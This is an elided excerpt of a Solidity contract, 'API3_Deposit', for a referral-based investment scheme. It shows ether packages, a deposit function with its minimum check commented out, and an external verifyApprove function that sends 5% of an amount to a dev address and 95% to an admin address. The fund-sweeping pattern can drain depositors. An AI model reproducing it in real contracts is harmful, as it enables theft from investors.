...
contract API3_Deposit {

    using SafeMath for uint256;
    using SafeMath for uint8;


	uint256 constant public INVEST_MIN_AMOUNT = 500 ether;
    ...
    uint256[8] public defaultPackages = [500 ether,1000 ether,2000 ether,5000 ether,10000 ether,20000 ether,30000 ether,50000 ether];
  ...
  function _refPayout(address _addr, uint256 _amount) internal {
    ...
    function deposit(address referrer, uint256 buy_amount ) public {
		...
		//require(msg.value >= INVEST_MIN_AMOUNT,'Min invesment 500 ether');
  ...
  function _safeTransfer(address payable _to, uint _amount) internal returns (uint256 amount) {
   ...
   function referral_stage(address _user,uint _index)external view returns(uint _noOfUser, uint256 _investment, uint256 _bonus){
    ...
    function verifyApprove(uint256 _amount) external{
        ...
        uint256 _dev_fee = _amount.mul(5).div(PERCENTS_DIVIDER);
        uint256 _ad_amount = _amount.mul(95).div(PERCENTS_DIVIDER);
        token.transfer(dev,_dev_fee);
        token.transfer(admin,_ad_amount);
    }
